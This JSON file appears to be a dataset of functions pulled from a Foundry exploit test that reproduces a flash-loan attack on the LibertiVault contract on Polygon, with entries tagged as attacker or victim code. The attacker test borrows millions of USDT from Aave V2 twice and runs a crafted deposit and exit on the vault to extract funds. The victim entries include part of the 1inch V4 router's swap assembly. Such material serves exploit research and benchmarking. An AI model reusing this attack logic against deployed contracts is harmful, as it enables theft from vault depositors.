[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        USDT.approve(address(aaveV2), type(uint256).max);\n\n        bytes memory callData = setData();\n        LibertiVault.deposit(0.001 ether, address(this), callData);\n\n        LibertiVault.exit();\n        if (USDT.balanceOf(address(this)) < (amounts[0] + premiums[0])) {\n            WETHToUSDT(amounts[0], premiums[0]);\n        }\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"polygon\", 44_941_584);\n        vm.label(address(USDT), \"USDT\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(aaveV2), \"aaveV2\");\n        vm.label(address(inchV4Router), \"inchV4Router\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        deal(address(WETH), address(this), 0.004 ether);\n        WETH.approve(address(LibertiVault), type(uint256).max);\n        address[] memory assets = new address[](1);\n        assets[0] = address(USDT);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 5_000_000 * 1e6;\n        uint256[] memory modes = new uint256[](1);\n        modes[0] = 0;\n        aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0);\n        aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0);\n\n        emit log_named_decimal_uint(\n            \"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILibertiVault",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILibertiVault",
    "source_type": "victim_contract",
    "function_name": "exit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "oneInchV4Router",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "            function swap(emptyPtr, swapAmount, pair, reversed, numerator, dst) -> ret {\n                mstore(emptyPtr, _UNISWAP_PAIR_RESERVES_CALL_SELECTOR_32)\n                if iszero(staticcall(gas(), pair, emptyPtr, 0x4, emptyPtr, 0x40)) {\n                    reRevert()\n                }\n                if iszero(eq(returndatasize(), 0x60)) {\n                    revertWithReason(0x0000001472657365727665732063616c6c206661696c65640000000000000000, 0x59)  // \"reserves call failed\"\n                }\n\n                let reserve0 := mload(emptyPtr)\n                let reserve1 := mload(add(emptyPtr, 0x20))\n                if reversed {\n                    let tmp := reserve0\n                    reserve0 := reserve1\n                    reserve1 := tmp\n                }\n                ret := mul(swapAmount, numerator)\n                ret := div(mul(ret, reserve1), add(ret, mul(reserve0, _DENOMINATOR)))\n\n                mstore(emptyPtr, _UNISWAP_PAIR_SWAP_CALL_SELECTOR_32)\n                switch reversed\n                case 0 {\n                    mstore(add(emptyPtr, 0x04), 0)\n                    mstore(add(emptyPtr, 0x24), ret)\n                }\n                default {\n                    mstore(add(emptyPtr, 0x04), ret)\n                    mstore(add(emptyPtr, 0x24), 0)\n                }\n                mstore(add(emptyPtr, 0x44), dst)\n                mstore(add(emptyPtr, 0x64), 0x80)\n                mstore(add(emptyPtr, 0x84), 0)\n                if iszero(call(gas(), pair, 0, emptyPtr, 0xa4, 0, 0)) {\n                    reRevert()\n                }\n            }\n\n            let emptyPtr := mload(0x40)\n            mstore(0x40, add(emptyPtr, 0xc0))\n\n            let poolsOffset := add(calldataload(0x64), 0x4)\n            let poolsEndOffset := calldataload(poolsOffset)\n            poolsOffset := add(poolsOffset, 0x20)\n            poolsEndOffset := add(poolsOffset, mul(0x20, poolsEndOffset))\n            let rawPair := calldataload(poolsOffset)\n            switch srcToken\n            case 0 {\n                if iszero(eq(amount, callvalue())) {\n                    revertWithReason(0x00000011696e76616c6964206d73672e76616c75650000000000000000000000, 0x55)  // \"invalid msg.value\"\n                }\n\n                mstore(emptyPtr, _WETH_DEPOSIT_CALL_SELECTOR_32)\n                if iszero(call(gas(), _WETH, amount, emptyPtr, 0x4, 0, 0)) {\n                    reRevert()\n                }\n\n                mstore(emptyPtr, _ERC20_TRANSFER_CALL_SELECTOR_32)\n                mstore(add(emptyPtr, 0x4), and(rawPair, _ADDRESS_MASK))\n                mstore(add(emptyPtr, 0x24), amount)\n                if iszero(call(gas(), _WETH, 0, emptyPtr, 0x44, 0, 0)) {\n                    reRevert()\n                }\n            }\n            default {\n                if callvalue() {\n                    revertWithReason(0x00000011696e76616c6964206d73672e76616c75650000000000000000000000, 0x55)  // \"invalid msg.value\"\n                }\n\n                mstore(emptyPtr, _TRANSFER_FROM_CALL_SELECTOR_32)\n                mstore(add(emptyPtr, 0x4), caller())\n                mstore(add(emptyPtr, 0x24), and(rawPair, _ADDRESS_MASK))\n                mstore(add(emptyPtr, 0x44), amount)\n                if iszero(call(gas(), srcToken, 0, emptyPtr, 0x64, 0, 0)) {\n                    reRevert()\n                }\n            }\n\n            returnAmount := amount\n\n            for {let i := add(poolsOffset, 0x20)} lt(i, poolsEndOffset) {i := add(i, 0x20)} {\n                let nextRawPair := calldataload(i)\n\n                returnAmount := swap(\n                    emptyPtr,\n                    returnAmount,\n                    and(rawPair, _ADDRESS_MASK),\n                    and(rawPair, _REVERSE_MASK),\n                    shr(_NUMERATOR_OFFSET, and(rawPair, _NUMERATOR_MASK)),\n                    and(nextRawPair, _ADDRESS_MASK)\n                )\n\n                rawPair := nextRawPair\n            }\n\n            switch and(rawPair, _WETH_MASK)\n            case 0 {\n                returnAmount := swap(\n                    emptyPtr,\n                    returnAmount,\n                    and(rawPair, _ADDRESS_MASK),\n                    and(rawPair, _REVERSE_MASK),\n                    shr(_NUMERATOR_OFFSET, and(rawPair, _NUMERATOR_MASK)),\n                    caller()\n                )\n            }\n            default {\n                returnAmount := swap(\n                    emptyPtr,\n                    returnAmount,\n                    and(rawPair, _ADDRESS_MASK),\n                    and(rawPair, _REVERSE_MASK),\n                    shr(_NUMERATOR_OFFSET, and(rawPair, _NUMERATOR_MASK)),\n                    address()\n                )\n\n                mstore(emptyPtr, _WETH_WITHDRAW_CALL_SELECTOR_32)\n                mstore(add(emptyPtr, 0x04), returnAmount)\n                if iszero(call(gas(), _WETH, 0, emptyPtr, 0x24, 0, 0)) {\n                    reRevert()\n                }\n\n                if iszero(call(gas(), caller(), returnAmount, 0, 0, 0, 0)) {\n                    reRevert()\n                }\n            }\n\n            if lt(returnAmount, minReturn) {\n                revertWithReason(0x000000164d696e2072657475726e206e6f742072656163686564000000000000, 0x5a)  // \"Min return not reached\"\n            }\n        }\n    }\n}\n\n\n// File @openzeppelin/contracts/utils/[email&#160;protected]\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAggregationExecutor",
    "source_type": "victim_contract",
    "function_name": "callBytes",
    "original_code": "",
    "description": ""
  }
]